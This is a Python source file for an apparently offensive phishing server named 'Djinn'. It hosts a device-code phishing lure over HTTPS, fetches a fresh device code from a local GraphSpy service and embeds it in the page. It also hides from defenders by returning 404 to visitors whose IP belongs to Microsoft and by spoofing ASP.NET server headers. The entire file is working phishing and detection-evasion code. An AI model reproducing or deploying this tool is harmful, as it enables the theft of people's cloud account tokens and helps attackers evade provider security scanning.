import ssl, os, requests, re
from ipwhois import IPWhois

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from random import randint

import lib.Util as Util
import lib.Conf as Conf

# Fetch Path
fpath = '/'.join(os.path.realpath(__file__).split('/')[:-2])

# Create colored logging
util = Util.util()

# Load Conf
conf = Conf.conf(f'{fpath}/dyn.conf')

# Create Base HTTP Request Handler
BaseHandle = BaseHTTPRequestHandler

# Set server header and version
BaseHandle.server_version = conf.httpserverversion
BaseHandle.sys_version = conf.httpsystemversion


class djinnserver:
    def __init__(self,args):
        global argsp 
        argsp = args
        global verbose
        if args.debug: verbose = True 
        else: verbose = False
        sslCon = ssl.SSLContext()
        sslCon.load_cert_chain(
            keyfile=f'{fpath}/resources/{conf.httpkey}',
            certfile=f'{fpath}/resources/{conf.httpcert}'
        )
        self.http_serve = HTTPServer((f'{conf.httpip}', int(conf.httpport)), self.Handler)
        self.http_serve.socket = sslCon.wrap_socket(
            self.http_serve.socket,
            server_side = True,
        )
    
    def run(self, codetracker):
        global code_tracker
        code_tracker = codetracker
        util.print_c(f'Serving Djinn on: 0.0.0.0:{conf.httpport} ...')
        util.print_p(f'Phishing URL is: https://{conf.httpdomain}{conf.httpendpoint}?{conf.httptokenparam}={conf.httptokenval}')
        self.http_serve.serve_forever()

    def stop(self):
        util.print_w('Shutting down HTTPServer...')
        self.http_serve.shutdown()

    class Handler(BaseHandle):
        def log_message(self, format, *args):
            global verbose
            if verbose:
                util.print_c(f"{self.client_address[0]} | [{self.log_date_time_string()}] | {self.path}")
            with open(f'{fpath}/logs/{str(datetime.today()).split()[0]}_djinn.log', mode='a') as logfile:
                logfile.write(f"{self.client_address[0]} | [{self.log_date_time_string()}] | {self.path}\n")
                logfile.close()

        def fourohfour(self):
            self.send_response(404)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes(open(f'{fpath}/resources/404.html','r').read(), 'UTF-8'))

        def fourohfive(self):
            self.send_response(405)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Allow', 'GET, HEAD, OPTIONS, TRACE')
            self.send_header('Content-Length', '1293')
            self.end_headers()
            self.wfile.write(bytes(open(f'{fpath}/resources/405.html','r').read(), 'UTF-8'))

        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Accept-Ranges', 'bytes')
            self.send_header('Content-Length', '703')
            self.send_header('X-Powered-By', 'ASP.NET')
            self.end_headers()

        def do_PUT(self):
            self.fourohfive()

        def do_POST(self):
            self.fourohfive()

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header('Allow', 'OPTIONS, TRACE, GET, HEAD, POST')
            self.send_header('Access-Control-Allow-Origin','*')
            self.send_header('Public', 'OPTIONS, TRACE, GET, HEAD, POST')
            self.send_header('X-Powered-By', 'ASP.NET')
            self.send_header('Content-Length', '0')
            self.end_headers()

        def do_GET(self):
            if not bool(re.search(r'(^192.168\.)|(^172\.(1[6-9]|2[0-9]|3[0-1])\.)|(^127\.)|(^10\.)', self.client_address[0])):
                whois_obj = IPWhois(self.client_address[0])
                if 'microsoft' in whois_obj.lookup_rdap(depth=0)['asn_description'].lower():
                    self.fourohfour()

            #query_params = parse_qs(uri.query)
            uri = urlparse(self.path)
            if uri.path == '/':
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(bytes(open(f'{fpath}/resources/200.html','r').read(), 'UTF-8'))

            elif uri.path == conf.httpendpoint:
                param_dict = dict(parse_qs(uri.query))
                if conf.httptokenparam in param_dict:
                    if param_dict[conf.httptokenparam][0] == conf.httptokenval:
                        # Use graphspy device code function to get user code
                        usercode = requests.post(f'http://127.0.0.1:{argsp.port}/api/generate_device_code').text
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/html')
                        self.send_header('Content-Length', '703')
                        self.end_headers()
                        self.wfile.write(bytes(open(f'{fpath}/resources/{conf.httppage}','r').read().replace('RplcMePlz', usercode), 'UTF-8'))
                    else:
                        self.fourohfour()
                else:
                    self.fourohfour()
            else:
                self.fourohfour()